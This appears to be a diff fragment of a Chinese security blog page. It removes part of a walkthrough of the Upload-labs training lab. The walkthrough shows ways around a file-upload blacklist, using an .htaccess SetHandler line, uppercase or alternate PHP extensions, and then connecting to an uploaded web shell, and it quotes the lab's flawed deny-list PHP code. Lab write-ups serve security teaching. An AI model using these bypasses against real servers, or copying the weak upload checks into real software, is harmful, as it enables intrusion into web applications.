class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>直接上传<code>.php</code>文件只是提示<code>此文件不允许上传!</code>。将文件后缀改为<code>.png</code>，和 Less-2 一样抓包修改文件后缀为<code>php</code>或<code>phtml</code>等，还是出现同样的提示</p>
-<p>但是可以上传<code>.htaccess</code>，内容如下（该行代码的作用是使服务器将所有类型的文件都解析为php）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
-<p><img src alt="4-1"></p>
-<blockquote>
-<p>在使用 .htaccess 之前，需要先开启对其的支持</p>
-<p>Linux：修改 /etc/apache2/apache2.conf 内的  AllowOverride 为 ALL（默认None）。然后重启 apache2 服务器</p>
-</blockquote>
-<p>上传成功后，我们上传一个大马，后缀随意</p>
-<p><img src alt="4-2"></p>
-<p>成功上传并且可以解析连接</p>
-<p><img src alt="4-3"></p>
-<p><strong>核心代码</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>先尝试前面的步骤，本关连<code>.htaccess</code>都无法上传，但是本关却可以通过大小写来绕过，尝试<code>.PHP</code></p>
-<p><img src alt="5-1"></p>
-<p>尝试连接，成功</p>
-<blockquote>
-<p>注意：大写PHP后缀名的解析，同样只存在于部分版本的apache</p>
-</blockquote>
-<p><img src alt="5-2"></p>
-<p><strong>核心代码</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>本题从源码中可以看出来，前一关将后缀转换成小写的函数<code>strtolower()</code>在本关没有使用，所以可以导致大小写绕过黑名单</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote>
-<p>① 抓包修改文件后缀（绕过前端验证）</p>
-<p>② 抓包修改 Content-Type 字段</p>
-<p>③ 针对黑名单，修改文件后缀为 php3、php5、phtml、php.xxx 等常见绕过黑名单的后缀</p>
-<p>④ 上传 .htaccess 使所有类型文件都解析为 php 文件，然后上传黑名单之外的文件类型</p>
-<p>⑤ 大小写绕过黑名单</p>
-</blockquote>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Upload-labs</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/09/20/Upload-labs 第1-10关/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/Knlvre.github-io/page/2/">2</a><a class="page-number" href="/Knlvre.github-io/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/Knlvre.github-io/page/6/">6</a><a class="extend next" rel="next" href="/Knlvre.github-io/page/2/">Next &raquo;</a>
@@ -1497,15 +1460,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">渗透测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">DVWA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">CTF比赛</a>
               </li>
              
               <li class="article-tag-list-item">
